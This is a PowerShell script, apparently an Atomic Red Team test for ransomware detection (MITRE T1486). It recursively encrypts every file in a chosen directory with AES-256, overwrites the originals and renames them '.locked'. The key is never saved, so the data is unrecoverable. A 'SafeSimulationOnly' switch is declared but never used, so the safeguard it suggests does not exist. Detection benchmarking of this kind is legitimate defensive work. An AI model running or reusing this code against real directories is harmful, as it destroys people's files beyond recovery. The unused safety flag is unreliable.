<#
.SYNOPSIS
    Atomic Red Team MITRE ATT&CK T1486 (Data Encrypted for Impact) Test Runner.
.DESCRIPTION
    Simulates a ransomware attack by enumerating files in lexicographical order,
    encrypting their contents with AES-256, and renaming files with a '.locked' extension.
    Paced with an intentional inter-file delay to allow realistic detection benchmarking.
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory=$false)]
    [string]$TargetDirectory = "$PSScriptRoot\..\sandbox_drive",
    
    [Parameter(Mandatory=$false)]
    [int]$DelayMs = 15,
    
    [Parameter(Mandatory=$false)]
    [switch]$SafeSimulationOnly = $true
)

$ErrorActionPreference = "Stop"

Write-Host "==========================================================" -ForegroundColor Red
Write-Host "   ATOMIC RED TEAM SIMULATOR: MITRE ATT&CK T1486          " -ForegroundColor Red
Write-Host "   Target: $TargetDirectory" -ForegroundColor Red
Write-Host "   PID: $PID" -ForegroundColor Red
Write-Host "==========================================================" -ForegroundColor Red

if (-not (Test-Path $TargetDirectory)) {
    Write-Error "Target directory does not exist: $TargetDirectory"
    return
}

# Generate temporary encryption key
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.GenerateKey()
$aes.GenerateIV()
$key = $aes.Key
$iv = $aes.IV

Write-Host "[*] Adversary Process ID: $PID started at $(Get-Date -Format 'HH:mm:ss.fff')" -ForegroundColor Yellow

# Enumerate all files in lexicographical order (mirroring Windows FindFirstFileW)
$files = Get-ChildItem -Path $TargetDirectory -Recurse -File | 
         Where-Object { $_.Extension -ne ".locked" } | 
         Sort-Object FullName

$total = $files.Count
$encryptedCount = 0
$startTime = [System.Diagnostics.Stopwatch]::StartNew()

Write-Host "[*] Found $total candidate files. Commencing directory traversal..." -ForegroundColor Yellow

foreach ($file in $files) {
    $filePath = $file.FullName
    $fileName = $file.Name

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        
        # Encrypt bytes with AES
        $encryptor = $aes.CreateEncryptor($key, $iv)
        $memStream = [System.IO.MemoryStream]::new()
        $cryptoStream = [System.Security.Cryptography.CryptoStream]::new($memStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $cryptoStream.Write($fileBytes, 0, $fileBytes.Length)
        $cryptoStream.FlushFinalBlock()
        $encryptedBytes = $memStream.ToArray()
        $cryptoStream.Dispose()
        $memStream.Dispose()
        $encryptor.Dispose()

        # Overwrite and rename to .locked
        $lockedPath = "$filePath.locked"
        [System.IO.File]::WriteAllBytes($filePath, $encryptedBytes)
        Rename-Item -Path $filePath -NewName (Split-Path $lockedPath -Leaf) -Force

        $encryptedCount++
        $elapsed = $startTime.ElapsedMilliseconds
        Write-Host "  [$elapsed ms] Encrypted: $fileName -> $(Split-Path $lockedPath -Leaf)" -ForegroundColor Red

        # Inter-file encryption delay
        if ($DelayMs -gt 0) {
            Start-Sleep -Milliseconds $DelayMs
        }
    } catch {
        Write-Warning "Failed or interrupted while encrypting $filePath : $_"
        break
    }
}

$startTime.Stop()
Write-Host "`n[*] Attack run ended. Encrypted $encryptedCount of $total files in $($startTime.ElapsedMilliseconds) ms." -ForegroundColor Cyan
